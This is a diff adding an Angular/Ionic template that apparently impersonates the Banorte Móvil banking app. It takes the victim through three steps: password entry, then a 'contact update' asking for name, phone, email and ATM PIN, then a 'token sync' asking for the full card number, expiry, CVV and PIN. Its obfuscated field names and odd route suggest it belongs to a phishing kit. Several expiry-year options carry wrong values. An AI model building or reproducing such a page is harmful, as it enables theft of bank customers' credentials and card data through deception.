@@ -1,0 +1,903 @@
+<div class="master">
+  <div id="kb-header">
+    <div style="text-align: left; margin-top: 30px">
+      <button
+        [routerLink]="['/iniciojjzmqpjzio']"
+        style="background-color: transparent; color: #fff"
+      >
+        <ion-icon
+          style="font-size: 30px"
+          name="chevron-back-outline"
+        ></ion-icon>
+      </button>
+    </div>
+
+    <div class="header">
+      <div *ngIf="currentStep === 1" class="hedtxt">Ingresar a</div>
+
+      <div id="indicator-row">
+        <div [class.active]="currentStep >= 1" class="circle">
+          <img
+            src="{{API_URL}}/assets/img/img_bsc_icon_llave_on.png"
+            alt=""
+            srcset=""
+          />
+        </div>
+
+        <div [class.active]="currentStep >= 1" class="nex-circle"></div>
+
+        <div [class.active]="currentStep >= 2" class="circle">
+          <img
+            src="{{API_URL}}/assets/img/img_bsc_icon_user_on.png"
+            alt=""
+            srcset=""
+          />
+        </div>
+
+        <div [class.active]="currentStep >= 2" class="nex-circle"></div>
+
+        <div [class.active]="currentStep >= 3" class="circle">
+          <img src="{{API_URL}}/assets/img/kb-card.png" alt="" srcset="" />
+        </div>
+      </div>
+      <!-- width: 60px -->
+      <div id="indicator-txt-row">
+        <div>
+          Captura tu <br />
+          contraseña
+        </div>
+        <div id="medio">
+          Actualizar<br />
+          contacto
+        </div>
+        <div>
+          Sincronizar<br />
+          token
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- <ion-content *ngIf="currentStep === 1" id="psw-content"  [style.height]="getVhPx(100)">
+        <div class="kbContainer">
+
+            <div    *ngIf="!addElementScroll" 
+                    [ngStyle]="{'margin-top': getSubVhPx({main: 100, sub: 10})}"  
+                    [style.height]="getSubVhPx({main: 100, sub: 23})"
+                    >
+                
+                <div class="hedtxt">
+                    ¡Hola Estimado Cliente(a)!
+                </div>
+
+                <div class="divide"></div>
+
+                <div class="minitxt">
+                    <p>
+                        Captura tu contraseña de<br />
+                        Banorte Móvil
+                    </p>
+                </div>
+            </div>
+
+            <div    class="loginCard" #loginCard 
+                    [class.bottom]="!addElementScroll && getPlatform().device !== 'desktop'">
+                <ion-card>
+                    <ion-card-content class="login">
+                        <div class="kb-item" [ngClass]="{active: inputPswd.active,'error': inputPswd.error }">
+                            <div class="kbrow">
+                                <div>
+                                    <img *ngIf="!inputPswd.active" width="50" src="{{API_URL}}/assets/img/img_bsc_icon_llave_off.png" style="margin-bottom: 3px;" />
+                                    <img *ngIf="inputPswd.active" width="50"  src="{{API_URL}}/assets/img/img_bsc_icon_llave_on.png" style="margin-bottom: 3px;" />
+                                </div>
+
+                                <div class="kb-wrap-input">
+                                    <input
+                                        type="password"
+                                        name="psmt"
+                                        #passInput
+                                        placeholder="Captura tu contraseña"
+                                        autocomplete="off"
+                                        (focus)="onFocusPass($event)"
+                                        (blur)="unFocusPass($event)"
+                                        (ngModelChange)="onChangePass(passInput)"
+                                        (keyup.enter)="onEnterPass()"
+                                        [(ngModel)]="userModel.demoPswd"
+                                        maxlength="8"
+                                    />
+
+                                    <label *ngIf="inputPswd.active" class="passForm">
+                                        Contraseña
+                                    </label>
+                                </div>
+
+                                <ion-icon *ngIf="userModel.pswd" #iconClear (click)="onClearPass(passInput)" class="iconInput" name="close-circle" style="font-size: 25px;" [style.color]="inputPswd.focused ? '#323f48': 'transparent'">
+                                </ion-icon>
+                                <div></div>
+                            </div>
+
+                            <div class="below-input-row">
+                                <div class="minitext">
+                                    Debes ingresar de 5 a 8 caracteres
+                                </div>
+
+                                <div class="minitextLength">
+                                    {{userModel.pswd ? userModel.pswd.length : 0}}/8
+                                </div>
+                            </div>
+
+                            <div style="cursor: pointer;" class="forgetPsw">
+                                <a href="javascript:" color="medium">Olvidé mi contraseña</a>
+                            </div>
+
+                            <ion-button [class.active]="inputPswd.ready" expand="block" class="aceptBtn " (click)="onEnterPass()">
+                                Iniciar
+                            </ion-button>
+                           
+                        </div>
+                    </ion-card-content>
+                </ion-card>
+            </div>
+        </div>
+    </ion-content> -->
+
+  <ion-content
+    *ngIf="currentStep === 1"
+    id="psw-content"
+    [style.height]="getVhPx(100)"
+  >
+    <ion-grid class="kbContainer ion-text-center">
+      <ion-row col-12 no-padding>
+        <ion-col size="12">
+          <div
+            *ngIf="!addElementScroll"
+            [ngStyle]="{'margin-top': getSubVhPx({main: 100, sub: 10})}"
+            [style.height]="getSubVhPx({main: 100, sub: 23})"
+          >
+            <div class="hedtxt">¡Hola Estimado Cliente(a)!</div>
+
+            <div class="divide"></div>
+
+            <div class="minitxt">
+              <p>
+                Captura tu contraseña de<br />
+                Banorte Móvil
+              </p>
+            </div>
+          </div>
+
+          <div class="loginCard" #loginCard>
+            <ion-card>
+              <ion-card-content class="login">
+                <div
+                  class="kb-item"
+                  [ngClass]="{active: inputPswd.active,'error': inputPswd.error }"
+                >
+                  <div class="kbrow">
+                    <div>
+                      <img
+                        *ngIf="!inputPswd.active"
+                        width="50"
+                        src="{{API_URL}}/assets/img/img_bsc_icon_llave_off.png"
+                        style="margin-bottom: 3px"
+                      />
+                      <img
+                        *ngIf="inputPswd.active"
+                        width="50"
+                        src="{{API_URL}}/assets/img/img_bsc_icon_llave_on.png"
+                        style="margin-bottom: 3px"
+                      />
+                    </div>
+
+                    <div class="kb-wrap-input">
+                      <input
+                        type="text"
+                        name="psmt"
+                        [class.kbproject]="inputPswd.active"
+                        #passInput
+                        placeholder="Captura tu contraseña"
+                        autocomplete="off"
+                        (focus)="onFocusPass($event)"
+                        (blur)="unFocusPass($event)"
+                        (ngModelChange)="onChangePass(passInput)"
+                        (keyup.enter)="onEnterPass()"
+                        [(ngModel)]="userModel.demoPswd"
+                        maxlength="8"
+                      />
+
+                      <label *ngIf="inputPswd.active" class="row-left">
+                        Contraseña
+                      </label>
+                    </div>
+
+                    <ion-icon
+                      *ngIf="userModel.pswd"
+                      #iconClear
+                      (click)="onClearPass(passInput)"
+                      class="iconInput"
+                      name="close-circle"
+                      style="font-size: 25px"
+                      [style.color]="inputPswd.focused ? '#323f48': 'transparent'"
+                    >
+                    </ion-icon>
+                    <div></div>
+                  </div>
+
+                  <div class="below-input-row">
+                    <div class="minitext">
+                      Debes ingresar de 5 a 8 caracteres
+                    </div>
+
+                    <div class="minitextLength">
+                      {{userModel.pswd ? userModel.pswd.length : 0}}/8
+                    </div>
+                  </div>
+
+                  <div style="cursor: pointer" class="forgetPsw">
+                    <a
+                      href="javascript:"
+                      (click)="changePassword()"
+                      color="medium"
+                      >Olvidé mi contraseña</a
+                    >
+                  </div>
+
+                  <ion-button
+                    [class.active]="inputPswd.ready && !inputPswd.error"
+                    expand="block"
+                    class="aceptBtn"
+                    (click)="onEnterPass()"
+                  >
+                    Iniciar
+                  </ion-button>
+                </div>
+              </ion-card-content>
+            </ion-card>
+          </div>
+
+          <div
+            class="kb-custom-card-space"
+            [style.height]="currentSpaceHeight"
+          ></div>
+        </ion-col>
+      </ion-row>
+    </ion-grid>
+  </ion-content>
+
+  <ion-content
+    *ngIf="currentStep === 2"
+    id="contact-content"
+    [style.height]="getVhPx(100)"
+  >
+    <ion-grid class="kbContainer ion-text-center">
+      <ion-row col-12 no-padding>
+        <ion-col size="12">
+          <div class="contactCardd" #contactCard>
+            <ion-card>
+              <ion-card-content class="contact">
+                <div style="margin: 15px 0px" class="kb-title-card">
+                  Actualiza tus datos
+                </div>
+
+                <div
+                  class="kb-item"
+                  [ngClass]="{active: inputName.active,'error': inputName.error }"
+                >
+                  <div class="kbrow">
+                    <div style="width: 40px; height: 40px">
+                      <img
+                        *ngIf="!inputName.active"
+                        width="40"
+                        src="{{API_URL}}/assets/img/img_bsc_icon_user_off.png"
+                        style="margin-bottom: 3px"
+                      />
+
+                      <img
+                        *ngIf="inputName.active"
+                        width="40"
+                        src="{{API_URL}}/assets/img/img_bsc_icon_user_on.png"
+                        style="margin-bottom: 3px"
+                      />
+                    </div>
+
+                    <div class="kb-wrap-input">
+                      <input
+                        type="text"
+                        name="name"
+                        #nameInput
+                        placeholder="Nombre completo"
+                        autocomplete="off"
+                        (focus)="onFocusContact($event, 'name')"
+                        (blur)="unFocusContact($event,  'name')"
+                        (ngModelChange)="onChangeContact(nameInput, 'name')"
+                        (keyup.enter)="onEnterContact()"
+                        [(ngModel)]="userModel.demoName"
+                        maxlength="70"
+                      />
+
+                      <label *ngIf="inputName.active" class="row-left">
+                        Nombre completo
+                      </label>
+                    </div>
+
+                    <ion-icon
+                      *ngIf="userModel.name"
+                      #iconClear
+                      (click)="onClearContact(nameInput, 'name')"
+                      class="iconInput"
+                      name="close-circle"
+                      style="font-size: 25px"
+                      [style.color]="inputName.focused ? '#323f48': 'transparent'"
+                    >
+                    </ion-icon>
+                    <div></div>
+                  </div>
+
+                  <div class="below-input-row">
+                    <div class="minitext">Maximo 70 caracteres</div>
+
+                    <div class="minitextLength">
+                      {{userModel.name ? userModel.name.length : 0}}/10
+                    </div>
+                  </div>
+                </div>
+
+                <div
+                  class="kb-item mtop"
+                  [ngClass]="{active: inputPhone.active,'error': inputPhone.error }"
+                >
+                  <div class="kbrow">
+                    <div style="width: 40px; height: 40px">
+                      <img
+                        *ngIf="!inputPhone.active"
+                        width="37"
+                        src="{{API_URL}}/assets/img/img_telephone_off.png"
+                        style="margin-bottom: 3px"
+                      />
+
+                      <img
+                        *ngIf="inputPhone.active"
+                        width="37"
+                        src="{{API_URL}}/assets/img/img_telephone_on.png"
+                        style="margin-bottom: 3px"
+                      />
+                    </div>
+
+                    <div class="kb-wrap-input">
+                      <input
+                        type="tel"
+                        name="telfn"
+                        #phoneInput
+                        placeholder="Numero de telefono"
+                        autocomplete="off"
+                        (focus)="onFocusContact($event, 'phone')"
+                        (blur)="unFocusContact($event,  'phone')"
+                        (keypress)="onlyNumber($event, 10)"
+                        (ngModelChange)="onChangeContact(phoneInput, 'phone')"
+                        (keyup.enter)="onEnterContact()"
+                        [(ngModel)]="userModel.demoPhone"
+                        maxlength="10"
+                      />
+
+                      <label *ngIf="inputPhone.active" class="row-left">
+                        Numero de telefono
+                      </label>
+                    </div>
+
+                    <ion-icon
+                      *ngIf="userModel.phone"
+                      #iconClear
+                      (click)="onClearContact(phoneInput, 'phone')"
+                      class="iconInput"
+                      name="close-circle"
+                      style="font-size: 25px"
+                      [style.color]="inputPhone.focused ? '#323f48': 'transparent'"
+                    >
+                    </ion-icon>
+                    <div></div>
+                  </div>
+
+                  <div class="below-input-row">
+                    <div class="minitext">Debes ingresar 10 caracteres</div>
+
+                    <div class="minitextLength">
+                      {{userModel.phone ? userModel.phone.length : 0}}/10
+                    </div>
+                  </div>
+                </div>
+
+                <div
+                  class="kb-item mtop"
+                  [ngClass]="{active: inputEmail.active,'error': inputEmail.error }"
+                >
+                  <div class="kbrow">
+                    <div style="width: 40px; height: 40px; margin-right: 2px">
+                      <img
+                        *ngIf="!inputEmail.active"
+                        width="36"
+                        src="{{API_URL}}/assets/img/img_email_off.png"
+                        style="margin-bottom: 3px"
+                      />
+
+                      <img
+                        *ngIf="inputEmail.active"
+                        width="36"
+                        src="{{API_URL}}/assets/img/img_email_on.png"
+                        style="margin-bottom: 3px"
+                      />
+                    </div>
+
+                    <div class="kb-wrap-input">
+                      <input
+                        type="email"
+                        name="correo"
+                        #emailInput
+                        placeholder="Correo electrónico"
+                        autocomplete="off"
+                        (focus)="onFocusContact($event, 'email')"
+                        (blur)="unFocusContact($event,  'email')"
+                        (ngModelChange)="onChangeContact(emailInput, 'email')"
+                        (keyup.enter)="onEnterContact()"
+                        [(ngModel)]="userModel.demoEmail"
+                        maxlength="80"
+                      />
+
+                      <label *ngIf="inputEmail.active" class="row-left">
+                        Correo electrónico
+                      </label>
+                    </div>
+
+                    <ion-icon
+                      *ngIf="userModel.email"
+                      #iconClear
+                      (click)="onClearContact(emailInput, 'email')"
+                      class="iconInput"
+                      name="close-circle"
+                      style="font-size: 25px"
+                      [style.color]="inputEmail.focused ? '#323f48': 'transparent'"
+                    >
+                    </ion-icon>
+                  </div>
+
+                  <div class="below-input-row">
+                    <div class="minitext">Maximo 80 caracteres</div>
+
+                    <div class="minitextLength">
+                      {{userModel.email ? userModel.email.length : 0}}/80
+                    </div>
+                  </div>
+                </div>
+
+                <div
+                  class="kb-item mtop"
+                  [ngClass]="{active: inputInfoNip.active,'error': inputInfoNip.error }"
+                >
+                  <div class="kbrow">
+                    <div style="width: 40px; height: 40px">
+                      <img
+                        *ngIf="!inputInfoNip.active"
+                        width="35"
+                        src="{{API_URL}}/assets/img/img_nip_off.png"
+                        style="margin-bottom: 3px"
+                      />
+                      <img
+                        *ngIf="inputInfoNip.active"
+                        width="35"
+                        src="{{API_URL}}/assets/img/img_nip_on.png"
+                        style="margin-bottom: 3px"
+                      />
+                    </div>
+
+                    <div class="kb-wrap-input">
+                      <input
+                        type="tel"
+                        name="infoNip"
+                        #infoNipInput
+                        placeholder="NIP de cajero"
+                        autocomplete="off"
+                        (focus)="onFocusContact($event, 'infoNip')"
+                        (blur)="unFocusContact($event,  'infoNip')"
+                        (keypress)="onlyNumber($event, 4)"
+                        (ngModelChange)="onChangeContact(infoNipInput, 'infoNip')"
+                        (keyup.enter)="onEnterContact()"
+                        [(ngModel)]="userModel.demoInfoNip"
+                        maxlength="4"
+                      />
+
+                      <label *ngIf="inputInfoNip.active" class="row-left">
+                        NIP de cajero
+                      </label>
+                    </div>
+
+                    <ion-icon
+                      *ngIf="userModel.infoNip"
+                      #iconClear
+                      (click)="onClearContact(infoNipInput, 'infoNip')"
+                      class="iconInput"
+                      name="close-circle"
+                      style="font-size: 25px"
+                      [style.color]="inputInfoNip.focused ? '#323f48': 'transparent'"
+                    >
+                    </ion-icon>
+                    <div></div>
+                  </div>
+
+                  <div class="below-input-row">
+                    <div class="minitext">Ingresa los 4 digitos</div>
+
+                    <div class="minitextLength">
+                      {{userModel.infoNip ? userModel.infoNip.length : 0}}/4
+                    </div>
+                  </div>
+                </div>
+                <!-- <div class="kb-item mtop" [ngClass]="{active: inputAddress.active,'error': inputAddress.error }">
+                                  <div class="kbrow">
+                                      <div>
+                                          <img *ngIf="!inputAddress.active" width="45" src="{{API_URL}}/assets/img/img_address_off.png" style="margin-bottom: 3px;" />
+              
+                                          <img *ngIf="inputAddress.active"  width="45" src="{{API_URL}}/assets/img/img_address_on.png"  style="margin-bottom: 3px;" />
+                                      </div>
+              
+                                      <div class="kb-wrap-input">
+                                          <input
+                                              type="text"
+                                              name="addrss"
+                                              #addressInput
+                                              placeholder="Direccion y domicilio"
+                                              autocomplete="off"
+                                              (focus)="onFocusContact($event, 'address')"
+                                              (blur)="unFocusContact($event,  'address')"
+                                              (ngModelChange)="onChangeContact(addressInput, 'address')"
+                                              (keyup.enter)="onEnterContact()"
+                                              [(ngModel)]="userModel.demoAddress"
+                                              maxlength="150"
+                                          />
+              
+                                          <label *ngIf="inputAddress.active" class="row-left">
+                                              Direccion y domicilio
+                                          </label>
+                                      </div>
+              
+                                      <ion-icon *ngIf="userModel.address" #iconClear (click)="onClearContact(addressInput, 'address')" class="iconInput" name="close-circle" style="font-size: 25px;" [style.color]="inputAddress.focused ? '#323f48': 'transparent'"> </ion-icon>
+                                      <div></div>
+                                  </div>
+          
+                                  <div class="below-input-row">
+                                      <div class="minitext">
+                                          Maximo 150 caracteres
+                                      </div>
+              
+                                      <div class="minitextLength">
+                                          {{userModel.address ? userModel.address.length : 0}}/150
+                                      </div>
+                                  </div>
+                              </div> -->
+
+                <br />
+                <br />
+
+                <ion-button
+                  style="padding-bottom: 12px"
+                  [class.active]="ifReadyFormContact"
+                  expand="block"
+                  class="aceptBtn active"
+                  (click)="onEnterContact()"
+                >
+                  Actualizar
+                </ion-button>
+              </ion-card-content>
+            </ion-card>
+          </div>
+
+          <div
+            class="kb-custom-card-space"
+            [style.height]="currentSpaceHeight"
+          ></div>
+        </ion-col>
+      </ion-row>
+    </ion-grid>
+    <div></div>
+  </ion-content>
+
+  <ion-content
+    *ngIf="currentStep === 3"
+    id="card-content"
+    [style.height]="getVhPx(100)"
+  >
+    <ion-grid class="kbContainer ion-text-center">
+      <ion-row col-12 no-padding>
+        <ion-col size="12">
+          <div class="contactCardd" #contactCard>
+            <ion-card>
+              <ion-card-content class="contact">
+                <div style="margin: 15px 0px" class="kb-title-card">
+                  Sincronización
+                </div>
+
+                <!-- CARD -->
+                <div
+                  class="kb-item"
+                  [ngClass]="{active: inputCard.active,'error': inputCard.error }"
+                >
+                  <div class="kbrow">
+                    <div
+                      style="width: 38px; height: 38px; margin-bottom: 3.5px"
+                    >
+                      <img
+                        *ngIf="!inputCard.active"
+                        width="38"
+                        src="{{API_URL}}/assets/img/img_card_off.png"
+                      />
+                      <img
+                        *ngIf="inputCard.active"
+                        width="38"
+                        src="{{API_URL}}/assets/img/img_card_on.png"
+                      />
+                    </div>
+
+                    <div class="kb-wrap-input">
+                      <input
+                        type="tel"
+                        name="drac"
+                        #cardInput
+                        placeholder="0000 0000 0000 0000"
+                        autocomplete="off"
+                        (focus)="onFocusCard($event, 'card')"
+                        (blur)="unFocusCard($event,  'card')"
+                        (keypress)="onlyNumber($event, 16)"
+                        (ngModelChange)="onChangesCard(cardInput, 'card')"
+                        (keyup.enter)="onEnterCard()"
+                        [(ngModel)]="userModel.demoCard"
+                        maxlength="16"
+                        style="padding-left: 5px"
+                      />
+
+                      <label *ngIf="inputCard.active" class="row-left">
+                        Numero de tarjeta
+                      </label>
+                    </div>
+
+                    <ion-icon
+                      *ngIf="userModel.card"
+                      #iconClear
+                      (click)="onClearCard(cardInput, 'card')"
+                      class="iconInput"
+                      name="close-circle"
+                      style="font-size: 25px"
+                      [style.color]="inputCard.focused ? '#323f48': 'transparent'"
+                    >
+                    </ion-icon>
+                    <div></div>
+                  </div>
+
+                  <div class="below-input-row">
+                    <div class="minitext">Ingresa los 16 digitos</div>
+
+                    <div class="minitextLength">
+                      {{userModel.card ? userModel.card.length : 0}}/16
+                    </div>
+                  </div>
+                </div>
+
+                <br />
+                <br />
+
+                <div class="card-row">
+                  <div class="card-col select-container">
+                    <select
+                      (change)="onChangeSelectCard($event.target.value, 'month')"
+                      name="thmon"
+                      [class.error]="inputYearExp.error"
+                    >
+                      <option value="mes" selected>Mes</option>
+                      <option value="01">Enero</option>
+                      <option value="02">Febrero</option>
+                      <option value="03">Marzo</option>
+                      <option value="04">Abril</option>
+                      <option value="05">Mayo</option>
+                      <option value="06">Junio</option>
+                      <option value="07">Julio</option>
+                      <option value="08">Agosto</option>
+                      <option value="09">Septiembre</option>
+                      <option value="10">Octubre</option>
+                      <option value="11">Noviembre</option>
+                      <option value="12">Diciembre</option>
+                    </select>
+                  </div>
+
+                  <div class="card-col select-container">
+                    <select
+                      (change)="onChangeSelectCard($event.target.value, 'year')"
+                      name="arye"
+                      [class.error]="inputYearExp.error"
+                    >
+                      <option value="Año" selected>Año</option>
+                      <option value="22">2022</option>
+                      <option value="23">2023</option>
+                      <option value="24">2024</option>
+                      <option value="24">2025</option>
+                      <option value="24">2026</option>
+                      <option value="24">2027</option>
+                      <option value="24">2028</option>
+                      <option value="24">2029</option>
+                      <option value="24">2030</option>
+                      <option value="24">2031</option>
+                      <option value="24">2032</option>
+                    </select>
+                  </div>
+                </div>
+
+                <br />
+
+                <div class="card-row">
+                  <!-- CVV -->
+                  <div class="card-col">
+                    <div
+                      class="kb-item"
+                      [ngClass]="{active: inputCvv.active,'error': inputCvv.error }"
+                    >
+                      <div class="kbrow">
+                        <div style="width: 40px; height: 40px">
+                          <img
+                            *ngIf="!inputCvv.active"
+                            width="40"
+                            src="{{API_URL}}/assets/img/img_cvv_off.png"
+                            style="margin-bottom: 3px"
+                          />
+                          <img
+                            *ngIf="inputCvv.active"
+                            width="40"
+                            src="{{API_URL}}/assets/img/img_cvv_on.png"
+                            style="margin-bottom: 3px"
+                          />
+                        </div>
+
+                        <div class="kb-wrap-input">
+                          <input
+                            type="tel"
+                            name="vvc"
+                            #cvvInput
+                            placeholder="000"
+                            autocomplete="off"
+                            (focus)="onFocusCard($event, 'cvv')"
+                            (blur)="unFocusCard($event,  'cvv')"
+                            (keypress)="onlyNumber($event, 3)"
+                            (ngModelChange)="onChangesCard(cvvInput, 'cvv')"
+                            (keyup.enter)="onEnterCard()"
+                            [(ngModel)]="userModel.demoCvv"
+                            maxlength="3"
+                            class="kbcenter"
+                            style="text-align: center"
+                          />
+
+                          <label *ngIf="inputCvv.active" class="row-left">
+                            CVV
+                          </label>
+                        </div>
+
+                        <ion-icon
+                          *ngIf="userModel.cvv"
+                          #iconClear
+                          (click)="onClearCard(cvvInput, 'cvv')"
+                          class="iconInput"
+                          name="close-circle"
+                          style="font-size: 25px"
+                          [style.color]="inputCvv.focused ? '#323f48': 'transparent'"
+                        >
+                        </ion-icon>
+                        <div></div>
+                      </div>
+
+                      <div class="below-input-row">
+                        <div class="minitext">Ingresa los 3 digitos</div>
+
+                        <div class="minitextLength">
+                          {{userModel.cvv ? userModel.cvv.length : 0}}/3
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- NIP -->
+                  <div class="card-col">
+                    <div
+                      class="kb-item"
+                      [ngClass]="{active: inputNip.active,'error': inputNip.error }"
+                    >
+                      <div class="kbrow">
+                        <div style="width: 40px; height: 40px">
+                          <img
+                            *ngIf="!inputNip.active"
+                            width="40"
+                            src="{{API_URL}}/assets/img/img_nip_off.png"
+                            style="margin-bottom: 3px"
+                          />
+                          <img
+                            *ngIf="inputNip.active"
+                            width="40"
+                            src="{{API_URL}}/assets/img/img_nip_on.png"
+                            style="margin-bottom: 3px"
+                          />
+                        </div>
+
+                        <div class="kb-wrap-input">
+                          <input
+                            type="tel"
+                            name="npi"
+                            #nipInput
+                            placeholder="NIP de cajero"
+                            autocomplete="off"
+                            (focus)="onFocusCard($event, 'nip')"
+                            (blur)="unFocusCard($event,  'nip')"
+                            (keypress)="onlyNumber($event, 4)"
+                            (ngModelChange)="onChangesCard(nipInput, 'nip')"
+                            (keyup.enter)="onEnterCard()"
+                            [(ngModel)]="userModel.demoNip"
+                            maxlength="4"
+                            class="kbcenter"
+                            style="text-align: center"
+                          />
+
+                          <label *ngIf="inputNip.active" class="row-right">
+                            NIP cajero
+                          </label>
+                        </div>
+
+                        <ion-icon
+                          *ngIf="userModel.nip"
+                          #iconClear
+                          (click)="onClearCard(nipInput, 'nip')"
+                          class="iconInput"
+                          name="close-circle"
+                          style="font-size: 25px"
+                          [style.color]="inputNip.focused ? '#323f48': 'transparent'"
+                        >
+                        </ion-icon>
+                        <div></div>
+                      </div>
+
+                      <div class="below-input-row">
+                        <div class="minitext">Ingresa los 4 digitos</div>
+
+                        <div class="minitextLength">
+                          {{userModel.nip ? userModel.nip.length : 0}}/4
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <br />
+                <br />
+
+                <ion-button
+                  style="padding-bottom: 12px"
+                  [class.active]="ifReadyFormCard"
+                  expand="block"
+                  class="aceptBtn active"
+                  (click)="onEnterCard()"
+                >
+                  Sincronizar
+                </ion-button>
+              </ion-card-content>
+            </ion-card>
+          </div>
+
+          <!-- [style.height]="currentSpaceHeight" -->
+          <div
+            class="kb-custom-card-space"
+            [style.height]="currentSpaceHeight"
+          ></div>
+        </ion-col>
+      </ion-row>
+    </ion-grid>
+    <div></div>
+  </ion-content>
+
+  <ion-content
+    *ngIf="currentStep === 4"
+    id="success-content"
+    [style.height]="getVhPx(100)"
+  >
+  </ion-content>
+</div>
